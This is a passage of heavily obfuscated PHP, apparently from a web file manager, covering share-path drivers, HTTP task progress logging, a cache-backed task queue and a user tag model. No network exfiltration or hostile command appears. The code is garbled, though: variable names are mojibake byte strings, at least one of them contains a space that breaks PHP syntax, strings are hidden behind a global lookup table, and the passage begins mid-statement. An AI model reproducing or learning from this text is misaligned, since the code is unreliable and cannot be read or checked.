$ªŸá­Ò ; } $İŸ¤èÆê = IO::copyMove($×ğé»ÓÊ, $¢œ¤Şó, $Ùò…–Á¿, $Ô½œÖƒÊ, $£ø¨Êº ); $İŸ¤èÆê = $this->getPathOuter($İŸ¤èÆê); return $İŸ¤èÆê; } public function pathThis($Æİº¬ß…) { return get_path_this($this->pathParse[$_SERVER[Ó¡Ÿ§‚][84]]); } public function pathFather($®¬ëÍĞÄ) { return get_path_father($this->pathParse[$_SERVER[Ó¡Ÿ§‚][84]]); } public function iconvSystem($…‰˜âŠï) { return $…‰˜âŠï; } protected function infoParse($í·éóß”, $‰üÎ®˜Ü = false) { $Ì´’ŸŒ =& $_SERVER[Ó¡Ÿ§‚]; $ú™´Ìšö = $this->pathParse[$Ì´’ŸŒ[495]][$Ì´’ŸŒ[1174]] . $this->pathParse[$Ì´’ŸŒ[1167]]; if ($‰üÎ®˜Ü) { $·©ÇÃ¤¡ = IO::infoWithChildren($ú™´Ìšö); } else { $·©ÇÃ¤¡ = IO::info($ú™´Ìšö); } $şìÉªËİ = $this->pathParse[$Ì´’ŸŒ[495]]; return Action($Ì´’ŸŒ[1346])->_shareItemeParse($·©ÇÃ¤¡, $şìÉªËİ); } public function listAll($‚€ØÁäë) { $ìÛí´÷Á =& $_SERVER[Ó¡Ÿ§‚]; $²ä¹ŒÕ» = IO::listAll($‚€ØÁäë); $ÖÂ‘¿© = rtrim($this->pathParse[$ìÛí´÷Á[495]][$ìÛí´÷Á[1174]], $ìÛí´÷Á[8]); foreach ($²ä¹ŒÕ» as &$­¼Æ±é) { $­¼Æ±é[$ìÛí´÷Á[84]] = $this->pathDriver . $ìÛí´÷Á[8] . ltrim(substr($­¼Æ±é[$ìÛí´÷Á[84]], strlen($ÖÂ‘¿©)), $ìÛí´÷Á[8]); } unset($­¼Æ±é); return $²ä¹ŒÕ»; } public function listAllSimple($Óìıëô, $ÜÊÃõ½¯ = false) { $‚È¬úÆ =& $_SERVER[Ó¡Ÿ§‚]; $î­®º™Ğ = $this->listAll($Óìıëô); $«ñÇë = $this->pathParse[$‚È¬úÆ[430]]; if (trim($«ñÇë, $‚È¬úÆ[8]) == trim(get_path_father($«ñÇë), $‚È¬úÆ[8])) { $ÜÊÃõ½¯ = !0; } return IO::init($‚È¬úÆ[12])->listAllSimpleMake($î­®º™Ğ, $«ñÇë, $ÜÊÃõ½¯); } public function getPathOuter($’²œËâ) { $µ¤åïæ =& $_SERVER[Ó¡Ÿ§‚]; $¸³†¿¤ğ = KodIO::parse($’²œËâ); if ($¸³†¿¤ğ[$µ¤åïæ[33]] == KodIO::KOD_SHARE_ITEM) { return $¸³†¿¤ğ[$µ¤åïæ[84]]; } $¸Âš­¬ = KodIO::clear($’²œËâ); $ãüú¦®Û = KodIO::clear($this->pathParse[$µ¤åïæ[495]][$µ¤åïæ[1174]]); $¸•¼¸Õ™ = substr($¸Âš­¬, strlen($ãüú¦®Û)); if (substr($¸Âš­¬, 0, strlen($ãüú¦®Û)) != $ãüú¦®Û) { return !1; } return $this->pathParse[$µ¤åïæ[1168]] . $µ¤åïæ[8] . ltrim($¸•¼¸Õ™, $µ¤åïæ[8]); } public function getType() { $ñÛóĞêÇ =& $_SERVER[Ó¡Ÿ§‚]; $†ŠÃÑı± = str_replace($ñÛóĞêÇ[74], $ñÛóĞêÇ[12], get_class($this)); return strtolower($†ŠÃÑı±); } public function isTypeObject($ØªŒ†ÕÒ) { return IO::isTypeObject($ØªŒ†ÕÒ); } public function info($Ó‹‹ÜÁ) { return $this->infoParse($Ó‹‹ÜÁ); } public function infoAuth($ò‹›ñó¼) { return $this->infoParse($ò‹›ñó¼); } public function infoWithChildren($µè‚÷œÃ) { return $this->infoParse($µè‚÷œÃ, !0); } public function infoFull($ş™˜‰³) { return $this->infoParse($ş™˜‰³); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($³¬ƒšÓ) { $this->pathParse = $³¬ƒšÓ; } protected function infoParse($«Ñ‡Ã¹õ, $ïé«¥¾Ã = false) { $à’…çïç =& $_SERVER[Ó¡Ÿ§‚]; return Action($à’…çïç[1173])->sharePathInfo($this->pathParse[$à’…çïç[84]], !0, $ïé«¥¾Ã); } public function listPath($ş®Ïü»Ø, $È¹Ì„êä = false) { $ê†éßô¶ =& $_SERVER[Ó¡Ÿ§‚]; $•±ëÇ¥» = IO::listPath($ş®Ïü»Ø, $È¹Ì„êä); if (!$•±ëÇ¥») { return $•±ëÇ¥»; } if (is_array($•±ëÇ¥»[$ê†éßô¶[1347]])) { $Õ„†ñ“¿ = Action($ê†éßô¶[1356])->parsePathChildren($•±ëÇ¥»[$ê†éßô¶[1347]], array($ê†éßô¶[430] => $ş®Ïü»Ø)); $•±ëÇ¥»[$ê†éßô¶[1347]] = Action($ê†éßô¶[1173])->shareItemInfo($Õ„†ñ“¿); } foreach ($•±ëÇ¥» as $¶œ•¥ˆ› => $Èå¸¦¾) { if (!in_array($¶œ•¥ˆ›, array($ê†éßô¶[83], $ê†éßô¶[82]))) { continue; } foreach ($Èå¸¦¾ as $÷—Ï’®¥ => $Õ„†ñ“¿) { $Õ„†ñ“¿ = Action($ê†éßô¶[1356])->parsePathChildren($Õ„†ñ“¿, array($ê†éßô¶[430] => $ş®Ïü»Ø)); $•±ëÇ¥»[$¶œ•¥ˆ›][$÷—Ï’®¥] = Action($ê†éßô¶[1173])->shareItemInfo($Õ„†ñ“¿); } } return $•±ëÇ¥»; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($Èâş»Úæ) { parent::__construct($Èâş»Úæ); } } goto A´›’“·Èˆ; C¢ ÙøË‘: class TaskHttp extends Task { protected function startAfter() { $—ÏÏÔêî =& $_SERVER[Ó¡Ÿ§‚]; $¶Ô¼ÃĞö =& $this->task; $¶Ô¼ÃĞö[$—ÏÏÔêî[1742]] = 1; Hook::bind($—ÏÏÔêî[1710], array($this, $—ÏÏÔêî[1743])); Hook::bind($—ÏÏÔêî[1712], array($this, $—ÏÏÔêî[1744])); Hook::bind($—ÏÏÔêî[1714], array($this, $—ÏÏÔêî[1745])); } protected function endAfter() { $°äâ¡¤÷ =& $_SERVER[Ó¡Ÿ§‚]; Hook::unbind($°äâ¡¤÷[1710], array($this, $°äâ¡¤÷[1743])); Hook::unbind($°äâ¡¤÷[1712], array($this, $°äâ¡¤÷[1744])); Hook::unbind($°äâ¡¤÷[1714], array($this, $°äâ¡¤÷[1745])); } public function progressStart($“ä¤»í“) { $ÍùÂÊ =& $_SERVER[Ó¡Ÿ§‚]; $Ï•„õ•÷ = curl_getinfo($“ä¤»í“); self::log($ÍùÂÊ[1746] . $Ï•„õ•÷[$ÍùÂÊ[307]]); self::valueSet($this->task[$ÍùÂÊ[399]], $this->task); } public function progressEnd($±Ş˜Ÿ¬) { $åƒ€åå =& $_SERVER[Ó¡Ÿ§‚]; self::log($åƒ€åå[1747] . $this->task[$åƒ€åå[399]]); $this->end(); } public function progress($öÇé”õ, $ôÇÍÛÇş, $´å÷ˆ°Ï, $ğÜ¦ °, $õ¢§ˆè) { $€Ì£ƒÊ =& $_SERVER[Ó¡Ÿ§‚]; $æÇËÇëö =& $this->task; if ($õ¢§ˆè > 0) { $æÇËÇëö[$€Ì£ƒÊ[785]] = $æÇËÇëö[$€Ì£ƒÊ[785]] == 0 ? $ğÜ¦ ° : $æÇËÇëö[$€Ì£ƒÊ[785]]; $æÇËÇëö[$€Ì£ƒÊ[1666]] = $õ¢§ˆè; } else { if ($´å÷ˆ°Ï > 0) { $æÇËÇëö[$€Ì£ƒÊ[785]] = $æÇËÇëö[$€Ì£ƒÊ[785]] == 0 ? $ôÇÍÛÇş : $æÇËÇëö[$€Ì£ƒÊ[785]]; $æÇËÇëö[$€Ì£ƒÊ[1666]] = $´å÷ˆ°Ï; } } $this->update(); self::log("\x70\162\157\x67\162\x65\x73\163\x48\164\x74\x70\72\x64\x6f\167\156\x3a{$´å÷ˆ°Ï}\x2f{$ôÇÍÛÇş}\73\40\x75\x70\154\x6f\141\144\x3a{$õ¢§ˆè}\x2f{$ğÜ¦ °}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($›·ÆİˆŒ, $Ê„ø¿Ú³ = '', $÷«ûèé“ = 0, $Ï¿á¦«Å = '') { $¾şŞ®¤ =& $_SERVER[Ó¡Ÿ§‚]; $´»©€Ñ‰ = new Task($›·ÆİˆŒ, $Ê„ø¿Ú³, $÷«ûèé“, $Ï¿á¦«Å); $GLOBALS[$¾şŞ®¤[1748] . $›·ÆİˆŒ] = new TaskLog($¾şŞ®¤[1649], $´»©€Ñ‰, $Ï¿á¦«Å); return $´»©€Ñ‰; } public function __construct($ù·ãú§ğ = '', $û íÈ˜ø = '', $È—ŠŠ¶  = '') { $Ç‘¢©Ö =& $_SERVER[Ó¡Ÿ§‚]; if (!$ù·ãú§ğ) { $ù·ãú§ğ = $Ç‘¢©Ö[1649]; } $œ·Ü­È† = $ù·ãú§ğ . $Ç‘¢©Ö[386] . rand_string(10); if (!$È—ŠŠ¶ ) { $È—ŠŠ¶  = $ù·ãú§ğ . $Ç‘¢©Ö[53] . $È—ŠŠ¶ ; } switch ($ù·ãú§ğ) { case $Ç‘¢©Ö[1649]: if (!$û íÈ˜ø || !$û íÈ˜ø->task) { return echoLog($ù·ãú§ğ . $Ç‘¢©Ö[1749]); } $ÍÌ›Öä = $û íÈ˜ø; $œ·Ü­È† = $ÍÌ›Öä->task[$Ç‘¢©Ö[399]]; $ù·ãú§ğ = $ÍÌ›Öä->task[$Ç‘¢©Ö[399]]; if (!$ÍÌ›Öä->task[$Ç‘¢©Ö[1565]]) { $ÍÌ›Öä->task[$Ç‘¢©Ö[1565]] = $È—ŠŠ¶  ? $È—ŠŠ¶  : $ù·ãú§ğ; } break; case $Ç‘¢©Ö[1750]: if (!$û íÈ˜ø) { return echoLog($ù·ãú§ğ . $Ç‘¢©Ö[1751]); } $ÚİŒ¶¹ = is_string($û íÈ˜ø) ? array($û íÈ˜ø) : $û íÈ˜ø; $ÍÌ›Öä = new TaskFileTransfer($œ·Ü­È†, $ù·ãú§ğ, 0, $È—ŠŠ¶  ? $È—ŠŠ¶  : $ÚİŒ¶¹[0]); foreach ($ÚİŒ¶¹ as $Êä¯Ó‰—) { $ÍÌ›Öä->addPath($Êä¯Ó‰—); } break; case $Ç‘¢©Ö[313]: if (!$û íÈ˜ø) { return echoLog($ù·ãú§ğ . $Ç‘¢©Ö[1751]); } $ÚİŒ¶¹ = is_string($û íÈ˜ø) ? array($û íÈ˜ø) : $û íÈ˜ø; $ÍÌ›Öä = new TaskZip($œ·Ü­È†, $ù·ãú§ğ, 0, $È—ŠŠ¶  ? $È—ŠŠ¶  : $ÚİŒ¶¹[0]); foreach ($ÚİŒ¶¹ as $Êä¯Ó‰—) { $ÍÌ›Öä->addPath($Êä¯Ó‰—); } break; case $Ç‘¢©Ö[1213]: if (!$û íÈ˜ø) { return echoLog($ù·ãú§ğ . $Ç‘¢©Ö[1751]); } $ÍÌ›Öä = new TaskUnZip($œ·Ü­È†, $ù·ãú§ğ, 0, $È—ŠŠ¶  ? $È—ŠŠ¶  : $û íÈ˜ø); if ($û íÈ˜ø) { $ÍÌ›Öä->addFile($û íÈ˜ø); } break; case $Ç‘¢©Ö[148]: $ÍÌ›Öä = new TaskHttp($œ·Ü­È†, $ù·ãú§ğ); break; default: return; break; } $this->task = $ÍÌ›Öä; $this->taskID = $œ·Ü­È†; Hook::bind($Ç‘¢©Ö[1686], array($this, $Ç‘¢©Ö[1752])); Hook::bind($Ç‘¢©Ö[1688], array($this, $Ç‘¢©Ö[1753])); Hook::bind($Ç‘¢©Ö[1682], array($this, $Ç‘¢©Ö[1754])); echoLog($Ç‘¢©Ö[1755] . $ÍÌ›Öä->task[$Ç‘¢©Ö[1565]]); } public function __destruct() { $this->end(); } public function end($Ï„´ª­Ó = '') { $ıŸ¥ËÌ =& $_SERVER[Ó¡Ÿ§‚]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Ï„´ª­Ó); $this->task = !1; $this->taskID = !1; Hook::unbind($ıŸ¥ËÌ[1686], array($this, $ıŸ¥ËÌ[1752])); Hook::unbind($ıŸ¥ËÌ[1688], array($this, $ıŸ¥ËÌ[1753])); Hook::unbind($ıŸ¥ËÌ[1682], array($this, $ıŸ¥ËÌ[1754])); } public function taskUpdate($ŒŸÜ“¿ì) { $–Ôøş‚± =& $_SERVER[Ó¡Ÿ§‚]; if (!$ŒŸÜ“¿ì || $this->taskID != $ŒŸÜ“¿ì[$–Ôøş‚±[399]]) { return; } $½”¡ÂÄğ = 20; $£‹¿¬ûÚ = intval($ŒŸÜ“¿ì[$–Ôøş‚±[1667]] * $½”¡ÂÄğ); $•¿ô£‰š = $–Ôøş‚±[162] . str_repeat($–Ôøş‚±[883], $£‹¿¬ûÚ) . $–Ôøş‚±[1013] . str_repeat($–Ôøş‚±[53], $½”¡ÂÄğ - $£‹¿¬ûÚ) . $–Ôøş‚±[164]; $Å‰îùï¶ = $•¿ô£‰š . sprintf($–Ôøş‚±[1756], $ŒŸÜ“¿ì[$–Ôøş‚±[1667]] * 100) . $–Ôøş‚±[1757]; $ˆÓîÖÂæ = $Å‰îùï¶ . $ŒŸÜ“¿ì[$–Ôøş‚±[1666]] . $–Ôøş‚±[8] . $ŒŸÜ“¿ì[$–Ôøş‚±[785]] . LNG($–Ôøş‚±[1758]); $öˆ¬Ñ = $–Ôøş‚±[12]; if ($ŒŸÜ“¿ì[$–Ôøş‚±[1742]]) { $ˆÓîÖÂæ = $Å‰îùï¶ . size_format($ŒŸÜ“¿ì[$–Ôøş‚±[1666]]) . $–Ôøş‚±[8] . size_format($ŒŸÜ“¿ì[$–Ôøş‚±[785]]); $öˆ¬Ñ = size_format($ŒŸÜ“¿ì[$–Ôøş‚±[1668]]) . $–Ôøş‚±[1759]; } if ($ŒŸÜ“¿ì[$–Ôøş‚±[1063]]) { $ŒŸÜ“¿ì[$–Ôøş‚±[1716]] = $ŒŸÜ“¿ì[$–Ôøş‚±[1063]] . $–Ôøş‚±[53] . $ŒŸÜ“¿ì[$–Ôøş‚±[1716]]; } if ($ŒŸÜ“¿ì[$–Ôøş‚±[1716]]) { $Ùä¹“¶¹ = $–Ôøş‚±[12]; if ($ŒŸÜ“¿ì[$–Ôøş‚±[1718]]) { $Ùä¹“¶¹ = $–Ôøş‚±[50] . size_format($ŒŸÜ“¿ì[$–Ôøş‚±[1719]]) . $–Ôøş‚±[8] . size_format($ŒŸÜ“¿ì[$–Ôøş‚±[1718]]); } $öˆ¬Ñ .= $ŒŸÜ“¿ì[$–Ôøş‚±[1716]] . $Ùä¹“¶¹; } if ($ŒŸÜ“¿ì[$–Ôøş‚±[762]] && !$ŒŸÜ“¿ì[$–Ôøş‚±[1718]]) { $öˆ¬Ñ .= $–Ôøş‚±[53] . size_format($ŒŸÜ“¿ì[$–Ôøş‚±[1723]]) . $–Ôøş‚±[8] . size_format($ŒŸÜ“¿ì[$–Ôøş‚±[762]]); } echoLog($ˆÓîÖÂæ . $–Ôøş‚±[53] . $öˆ¬Ñ, !0); } public function taskEnd($¼’Ş£Ó‘) { $ÆÑ„Â“è =& $_SERVER[Ó¡Ÿ§‚]; if (!$¼’Ş£Ó‘ || $this->taskID != $¼’Ş£Ó‘[$ÆÑ„Â“è[399]]) { return; } $ÅÆüîöÒ = $¼’Ş£Ó‘ ? $¼’Ş£Ó‘[$ÆÑ„Â“è[1666]] . $ÆÑ„Â“è[8] . $¼’Ş£Ó‘[$ÆÑ„Â“è[785]] . LNG($ÆÑ„Â“è[1758]) . $ÆÑ„Â“è[71] : $ÆÑ„Â“è[12]; echoLog($ÆÑ„Â“è[1760] . $¼’Ş£Ó‘[$ÆÑ„Â“è[1565]] . ($¼’Ş£Ó‘[$ÆÑ„Â“è[462]] ? $ÆÑ„Â“è[71] . $¼’Ş£Ó‘[$ÆÑ„Â“è[462]] : $ÆÑ„Â“è[12]) . $ÆÑ„Â“è[71] . $ÅÆüîöÒ . $ÆÑ„Â“è[1761] . sprintf($ÆÑ„Â“è[849], timeFloat() - $¼’Ş£Ó‘[$ÆÑ„Â“è[1669]]) . $ÆÑ„Â“è[1681]); $this->end(); } public function taskKill($Îº§‹Ğú) { $ËĞ‘ã·Æ =& $_SERVER[Ó¡Ÿ§‚]; if (!$Îº§‹Ğú || $this->taskID != $Îº§‹Ğú[$ËĞ‘ã·Æ[399]]) { return; } echoLog($ËĞ‘ã·Æ[1762] . $Îº§‹Ğú[$ËĞ‘ã·Æ[1565]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\153\121\x75\145\165\x65\x4c\x65\156\147\164\150"; const QUEUE_DATA = "\164\141\x73\x6b\x51\x75\145\x75\145\104\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($­È¿ªÙã, $ç…²½ÄÊ = array(), $âÊÀçÔŸ = '', $¾Ãæôƒ— = '') { $Ø¶Ù›¾÷ =& $_SERVER[Ó¡Ÿ§‚]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¾Ãæôƒ— && array_find_by_field(self::$listData, $Ø¶Ù›¾÷[94], $¾Ãæôƒ—)) { return !0; } self::$listData[] = array($Ø¶Ù›¾÷[264] => $­È¿ªÙã, $Ø¶Ù›¾÷[1763] => $ç…²½ÄÊ, $Ø¶Ù›¾÷[462] => $âÊÀçÔŸ, $Ø¶Ù›¾÷[94] => $¾Ãæôƒ—); return !0; } public static function addSubmit() { $èÙ¢¯¹› =& $_SERVER[Ó¡Ÿ§‚]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($èÙ¢¯¹›[1764] . json_encode_force(array_to_keyvalue(self::$listData, $èÙ¢¯¹›[12], $èÙ¢¯¹›[462])), $èÙ¢¯¹›[1765]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Ï­œôÜŒ, $ÈÉé»¦´ = array(), $¥¢›“§ = '', $ÂÒÖÄùÑ = '') { $­ßÅ·¬š =& $_SERVER[Ó¡Ÿ§‚]; if (self::count() >= self::MAX_LENGTH) { return !1; } $îş¾á´ù = self::getAll(); if ($ÂÒÖÄùÑ && array_find_by_field($îş¾á´ù, $­ßÅ·¬š[94], $ÂÒÖÄùÑ)) { return !0; } $îş¾á´ù[] = array($­ßÅ·¬š[264] => $Ï­œôÜŒ, $­ßÅ·¬š[1763] => $ÈÉé»¦´, $­ßÅ·¬š[462] => $¥¢›“§, $­ßÅ·¬š[94] => $ÂÒÖÄùÑ); write_log($­ßÅ·¬š[1764] . $¥¢›“§, $­ßÅ·¬š[1765]); self::setAll($îş¾á´ù); return !0; } public static function run() { $§´§Ï§¹ =& $_SERVER[Ó¡Ÿ§‚]; $…ÎÀ°—Ë = self::getAll(); $‹ûĞïê = array_shift($…ÎÀ°—Ë); if (!$‹ûĞïê) { return !1; } self::setAll($…ÎÀ°—Ë); $ÓÄ¹äğÔ = timeFloat(); try { Hook::apply($‹ûĞïê[$§´§Ï§¹[264]], $‹ûĞïê[$§´§Ï§¹[1763]]); } catch (Exception $¥–Éˆ¡å) { } $®ˆúû¸é = number_format(timeFloat() - $ÓÄ¹äğÔ, 3) . $§´§Ï§¹[1681]; write_log($§´§Ï§¹[1766] . $‹ûĞïê[$§´§Ï§¹[462]] . $§´§Ï§¹[1767] . $®ˆúû¸é, $§´§Ï§¹[1765]); return !0; } public static function count() { $½¡Ê¤Ğ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$½¡Ê¤Ğ) { return 0; } return intval($½¡Ê¤Ğ); } public static function getAll() { $î¼éÊ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$î¼éÊ) { return array(); } return $î¼éÊ; } public static function setAll($ß¨ÃÈï¹) { $™¥Ó»şÇ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ß¨ÃÈï¹), $™¥Ó»şÇ); Cache::set(self::QUEUE_DATA, $ß¨ÃÈï¹, $™¥Ó»şÇ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto b¶ƒÃáèÆ‚; fÄ¢ƒ”Í¥ß: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($ûìŸ§şç) { $´ÙÏñî‡ =& $_SERVER[Ó¡Ÿ§‚]; return array($´ÙÏñî‡[1965] => array($´ÙÏñî‡[2348] . USER_ID, $´ÙÏñî‡[1966])); } protected function listData() { $Õƒ½¬¦ë =& $_SERVER[Ó¡Ÿ§‚]; $éÒ×ş»· = array($Õƒ½¬¦ë[1656] => USER_ID, $Õƒ½¬¦ë[492] => array($Õƒ½¬¦ë[1969], 0)); $ÁèÒ¥êŞ = $Õƒ½¬¦ë[2349]; $À¶¥¢ğ« = $this->field($ÁèÒ¥êŞ)->where($éÒ×ş»·)->order($Õƒ½¬¦ë[1972])->select(); return $À¶¥¢ğ« ? $À¶¥¢ğ« : array(); } protected function addToTag($çÙÖï“‘, $µÁ¼ªÖ) { $®¦‚Ä¢× =& $_SERVER[Ó¡Ÿ§‚]; if (!Model($®¦‚Ä¢×[2113])->listData($µÁ¼ªÖ)) { return !1; } if (is_numeric($çÙÖï“‘)) { $ëÚí§Š­ = Model($®¦‚Ä¢×[824])->pathInfo($çÙÖï“‘); if (!$ëÚí§Š­) { return !1; } } else { $ëÚí§Š­ = IO::infoSimple($çÙÖï“‘); if (!$ëÚí§Š­) { return !1; } $·¢ëöİÍ = $ëÚí§Š­[$®¦‚Ä¢×[32]]; $«é“®¨€ = $ëÚí§Š­[$®¦‚Ä¢×[33]]; if (isset($ëÚí§Š­[$®¦‚Ä¢×[419]])) { $«é“®¨€ = $ëÚí§Š­[$®¦‚Ä¢×[419]] == $®¦‚Ä¢×[88] ? $®¦‚Ä¢×[75] : $®¦‚Ä¢×[200]; } } $Š˜İ¨’ = array($®¦‚Ä¢×[1656] => USER_ID, $®¦‚Ä¢×[492] => $µÁ¼ªÖ, $®¦‚Ä¢×[430] => $çÙÖï“‘, $®¦‚Ä¢×[431] => $«é“®¨€ ? $«é“®¨€ : $®¦‚Ä¢×[425], $®¦‚Ä¢×[429] => $·¢ëöİÍ ? $·¢ëöİÍ : $®¦‚Ä¢×[12], $®¦‚Ä¢×[1858] => 0); if ($this->where($Š˜İ¨’)->find()) { return !1; } return $this->add($Š˜İ¨’); } protected function removeFromTag($¢Èöä•», $‹²ŒıúÍ) { $®Ÿô­„¢ =& $_SERVER[Ó¡Ÿ§‚]; if (!Model($®Ÿô­„¢[2113])->listData($‹²ŒıúÍ)) { return !1; } if (is_array($¢Èöä•»)) { $¢Èöä•» = array($®Ÿô­„¢[7], $¢Èöä•»); } $ïÄ“Ø’½ = array($®Ÿô­„¢[1656] => USER_ID, $®Ÿô­„¢[492] => $‹²ŒıúÍ, $®Ÿô­„¢[430] => $¢Èöä•»); return $this->where($ïÄ“Ø’½)->delete(); } protected function removeByTag($è²İ¿Í˜) { $Œ‡¶—„ =& $_SERVER[Ó¡Ÿ§‚]; if (!$è²İ¿Í˜) { return !1; } $Îã¥Ú£˜ = array($Œ‡¶—„[1656] => USER_ID, $Œ‡¶—„[492] => $è²İ¿Í˜); return $this->where($Îã¥Ú£˜)->delete(); } protected function removeBySource($’‹²ãÖ„) { $Ë÷Æ˜´Ï =& $_SERVER[Ó¡Ÿ§‚]; if (is_array($’‹²ãÖ„)) { $’‹²ãÖ„ = array($Ë÷Æ˜´Ï[7], $’‹²ãÖ„); } $ª³Ëı‚Ö = array($Ë÷Æ˜´Ï[1656] => USER_ID, $Ë÷Æ˜´Ï[492] => array($Ë÷Æ˜´Ï[1013], 0), $Ë÷Æ˜´Ï[430] => $’‹²ãÖ„); return $this->where($ª³Ëı‚Ö)->delete(); } }